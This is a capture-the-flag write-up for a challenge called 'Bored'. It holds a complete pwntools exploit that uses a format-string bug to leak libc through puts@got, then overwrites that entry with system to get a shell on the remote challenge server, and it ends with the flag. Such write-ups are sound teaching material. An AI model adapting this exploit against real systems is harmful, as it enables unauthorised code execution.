# Bored
```
Today is very boring, It’s a very boring day, There is nothing much to look at, There is nothing much to say, There’s a peacock on my sneakers, There’s a penguin on my head, There’s a dormouse on my doorstep, I am going back to bed.
```

## Challenge
> Leak base libc and then overwrite puts@got to system@libc

Security mechanism used:
```bash
gef➤  checksec
Canary                        : ✓ (value: 0xb9416acb41621e00)
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```python
from pwn import *

elf = ELF('./bored')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

r = remote('spclr.ch', 7331)
#r = process('./bored', env={"LD_PRELOAD" : libc.path})
pause()
r.recvuntil(b'day...\n')

payload = b'A' * 4 + b'%7$s'
payload += p64(elf.got['puts'])

r.sendline(payload)

r.recvuntil(b'AAAA')
puts_libc = u64(r.recv(6).strip().ljust(8, b'\x00'))
print("PUTS LIBC: " + hex(puts_libc))

# used libc: libc6_2.31-0ubuntu9.1_amd64 via try and error
base_libc = puts_libc - 0x0875a0
puts_got = elf.got['puts']
system_libc = base_libc + 0x055410

print(hex(system_libc))
r.recvuntil(b'say...\n')
payload = fmtstr_payload(6, {puts_got:system_libc}, write_size='short')
print(payload)
r.sendline(payload)

r.interactive()
```

Flag: ictf{Theres_a_dormouse_on_my_doorstep_I_am_going_back_to_bed}